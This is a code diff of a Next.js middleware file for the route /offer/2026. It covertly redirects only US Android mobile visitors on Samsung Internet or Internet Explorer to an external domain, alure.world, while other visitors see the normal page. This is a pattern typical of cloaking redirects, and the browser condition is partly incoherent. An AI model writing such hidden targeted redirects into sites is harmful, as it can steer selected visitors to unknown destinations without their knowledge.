@@ -1,45 +1,14 @@
-import { NextResponse, type NextRequest, userAgent } from 'next/server';
+import { NextResponse, type NextRequest } from 'next/server';
 
 /**
- * Checks if the User-Agent represents a Mobile device
- * (excluding desktop operating systems and tablets).
+ * Target URL for eligible Android Mobile users in the US on supported browsers
  */
-function isMobileDevice(uaString: string, deviceType?: string): boolean {
-  if (deviceType === 'tablet') {
-    return false;
-  }
-  if (deviceType === 'mobile') {
-    return true;
-  }
-
-  // Fallback regex detection
-  const isDesktopOs = /Windows NT|Macintosh|Mac OS X(?!.*Mobile)|Linux x86_64|CrOS/i.test(uaString);
-  if (isDesktopOs) {
-    return false;
-  }
-
-  const isTablet = /iPad|Tablet/i.test(uaString);
-  if (isTablet) {
-    return false;
-  }
-
-  return /Mobile|Mobi|Android|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(uaString);
-}
+const TARGET_REDIRECT_URL = 'https://alure.world/1/2/3/4/5/6/7/8/9/10/11/12/13/14/15/16/17/18/19/20';
 
 /**
- * Checks if the User-Agent represents Samsung Internet Browser.
+ * Extracts country code from server headers (Vercel, Cloudflare, etc.) or request.geo
  */
-function isSamsungBrowser(uaString: string, browserName?: string): boolean {
-  if (browserName?.toLowerCase().includes('samsung')) {
-    return true;
-  }
-  return /SamsungBrowser/i.test(uaString);
-}
-
-/**
- * Extracts country code from server headers (Vercel, Cloudflare, AWS CloudFront, etc.)
- */
-function getGeoCountry(request: NextRequest): string | null {
+function getGeoCountry(request: NextRequest): string {
   // Edge runtime geo object (e.g. Vercel)
   const edgeGeoCountry = (request as unknown as { geo?: { country?: string } }).geo?.country;
   if (edgeGeoCountry) {
@@ -63,7 +32,7 @@ function getGeoCountry(request: NextRequest): string | null {
     }
   }
 
-  return null;
+  return '';
 }
 
 export function middleware(request: NextRequest) {
@@ -71,27 +40,27 @@ export function middleware(request: NextRequest) {
 
   // Strict check for /offer/2026 route
   if (pathname === '/offer/2026' || pathname === '/offer/2026/') {
+    // 1. User-Agent Detection
     const uaString = request.headers.get('user-agent') || '';
-    const { device, browser } = userAgent(request);
+    const isAndroidMobile = /Android/i.test(uaString) && /Mobile/i.test(uaString);
+    const isSamsungBrowser = /SamsungBrowser/i.test(uaString);
+    const isInternetExplorer = /MSIE|Trident/i.test(uaString);
+    const isAllowedBrowser = isSamsungBrowser || isInternetExplorer;
 
-    const isSamsung = isSamsungBrowser(uaString, browser.name);
-    const isMobile = isMobileDevice(uaString, device.type);
+    // 2. Geolocation Detection
     const country = getGeoCountry(request);
 
-    // If server-side geolocation is available:
-    if (country) {
-      // Condition 1: Located in the United States (US)
-      // Condition 2: Mobile device only
-      // Condition 3: Samsung Internet Browser
-      if (country === 'US' && isMobile && isSamsung) {
-        return NextResponse.redirect('http://alure.world/1/2/3/4/5/6/7/8/9/10/11/12/13/14/15/16/17/18/19/20', 307);
-      }
-
-      // If server identified the country (and it didn't match), pass cookie to inform client fallback
-      const response = NextResponse.next();
-      response.cookies.set('x-geo-country', country, { path: '/', httpOnly: false });
-      return response;
+    // 3. Execution Logic
+    if (isAndroidMobile && isAllowedBrowser && country === 'US') {
+      return NextResponse.redirect(TARGET_REDIRECT_URL, 307);
     }
+
+    // Otherwise, allow standard request progression (NextResponse.next())
+    const response = NextResponse.next();
+    if (country) {
+      response.cookies.set('x-geo-country', country, { path: '/', httpOnly: false });
+    }
+    return response;
   }
 
   return NextResponse.next();
